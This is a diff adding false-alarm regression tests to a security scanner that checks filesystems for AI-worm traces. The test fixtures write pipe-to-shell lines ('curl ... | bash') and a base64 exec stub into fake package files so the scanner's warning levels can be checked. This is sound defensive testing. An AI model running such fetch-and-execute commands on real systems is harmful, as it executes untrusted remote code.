@@ -171,3 +171,50 @@ def test_emitted_codes_are_declared():
     assert all(
         c.startswith("security.ai_worm_filesystem.") for c in declared
     )
+
+
+# --- false-alarm regressions -------------------------------------------------
+
+import sys as _sys
+
+
+def _scan_dir(mod, root):
+    modmod = _sys.modules[type(mod).__module__]
+    with patch.object(modmod, "_SCAN_DIRS_UNIX", [str(root)]):
+        return mod.check(_make_profile())
+
+
+def _obf(result):
+    return [f for f in result.findings if f.data.get("check") in ("obfuscated_script", "library_install_strings")]
+
+
+def test_install_one_liner_in_site_packages_is_info_only(tmp_path):
+    mod = _get_module()
+    for sub in ("uv/env/lib/python3.12/site-packages/huggingface_hub", "node_modules/split/examples"):
+        d = tmp_path / sub
+        d.mkdir(parents=True)
+        (d / "_runtime.py").write_text('print("curl -LsSf https://hf.co/cli/install.sh | bash")\n')
+    found = _obf(_scan_dir(mod, tmp_path))
+    assert found
+    assert all(f.severity == Severity.INFO for f in found)
+    assert len(found) == 1  # aggregated
+
+
+def test_pipe_to_shell_in_loose_script_still_warns_with_accurate_title(tmp_path):
+    mod = _get_module()
+    (tmp_path / "setup.sh").write_text("curl https://example.com/x.sh | bash\n")
+    found = _obf(_scan_dir(mod, tmp_path))
+    assert len(found) == 1
+    assert found[0].severity == Severity.WARNING
+    assert "obfuscated" not in found[0].title.lower()
+
+
+def test_real_obfuscation_still_warns_even_inside_site_packages(tmp_path):
+    mod = _get_module()
+    d = tmp_path / "lib/python3.12/site-packages/evil"
+    d.mkdir(parents=True)
+    (d / "x.py").write_text("import base64\nexec(base64.b64decode('aGk='))\n")
+    found = _obf(_scan_dir(mod, tmp_path))
+    assert len(found) == 1
+    assert found[0].severity == Severity.WARNING
+    assert found[0].title.startswith("Obfuscated script")
